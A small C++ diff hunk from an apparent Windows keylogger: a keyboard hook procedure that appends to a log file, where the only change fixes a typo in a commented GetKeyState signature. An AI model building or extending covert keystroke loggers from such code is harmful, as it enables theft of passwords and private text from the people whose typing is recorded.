@@ -207,7 +207,7 @@ LRESULT CALLBACK HookProcedure(int nCode, WPARAM wParam, LPARAM lParam)
 {
 	/*
 	SHORT WINAPI GetKeyState(
-		_In_ int nVirtKeydasdsad
+		_In_ int nVirtKey
 		);
 	*/
 	std::ofstream myfile(fileName, std::ios::out | std::ios::app);
